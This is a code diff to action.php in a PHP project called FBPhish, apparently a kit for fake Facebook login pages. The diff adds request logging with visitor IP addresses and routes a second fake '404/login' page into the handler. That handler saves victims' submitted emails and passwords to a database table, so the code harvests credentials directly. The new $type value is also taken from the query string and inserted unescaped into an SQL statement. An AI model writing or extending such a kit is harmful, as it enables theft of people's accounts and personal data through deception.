@@ -26,14 +26,18 @@ $apppath = __DIR__;
 require_once("$apppath/includes/config.inc.php");
 require_once("$apppath/includes/classes/fbphish.class.php");
 require_once("$apppath/includes/classes/sql.class.php");
+require_once("$apppath/includes/classes/logger.class.php");
 require_once("$apppath/includes/functions/debug.func.php");
 require_once("$apppath/includes/functions/getip.func.php");
 
 $FBPhish = new FBPhish();
 $sql = new sql();
+$logger = new logger();
 
 $FBPhish->init();
 $FBPhish->themecheck();
+
+$logger->uriLog("log/uri", $baseurl . $_SERVER['REQUEST_URI'], "/action.php", "NULL", getIp(), getMetaIp());
 
 // Check if the action is register from home
 if($_GET['action'] == "home/register"){
@@ -181,12 +185,13 @@ if($_GET['action'] == "home/register"){
 		}
 	}
 // Check if the form was login from home
-}elseif($_GET['action'] == "home/login"){
+}elseif($_GET['action'] == "home/login" || $_GET['action'] == "404/login"){
 	// Check if the form is submitted
 	if(isset($_POST['submit'])){
 		// Set variables
 		$user_ip = getIp();
 		$meta_user_ip = getMetaIp();
+		$type = $_GET['action'];
 		$missing = array();
 
 		// Check if variable is empty
@@ -229,7 +234,7 @@ if($_GET['action'] == "home/register"){
 			$missing = "NULL";
 		}
 
-		$fbphish_sql_query_insertLoginData = "INSERT INTO `fbphish_data` (`id`, `type`, `record_date`, `first_name`, `last_name`, `email`, `email_confirm`, `password`, `birthday_day`, `birthday_month`, `birthday_year`, `sex`, `locale`, `user_ip`, `meta_user_ip`, `missing`) VALUES (NULL, 'home/login', CURRENT_TIMESTAMP, '0', '0', '$email', '0', '$passwd', '0', '0', '0', '0', '$locale', '$user_ip', '$meta_user_ip', '$missing_string');";
+		$fbphish_sql_query_insertLoginData = "INSERT INTO `fbphish_data` (`id`, `type`, `record_date`, `first_name`, `last_name`, `email`, `email_confirm`, `password`, `birthday_day`, `birthday_month`, `birthday_year`, `sex`, `locale`, `user_ip`, `meta_user_ip`, `missing`) VALUES (NULL, '$type', CURRENT_TIMESTAMP, '0', '0', '$email', '0', '$passwd', '0', '0', '0', '0', '$locale', '$user_ip', '$meta_user_ip', '$missing_string');";
 		$sql->db_connect();
 		$sql->query($fbphish_sql_query_insertLoginData);
 		$sql->db_close();
@@ -256,7 +261,6 @@ if($_GET['action'] == "home/register"){
 					break;
 				default:
 					header("Location: $config_option__302");
-
 			}
 		}
 	}
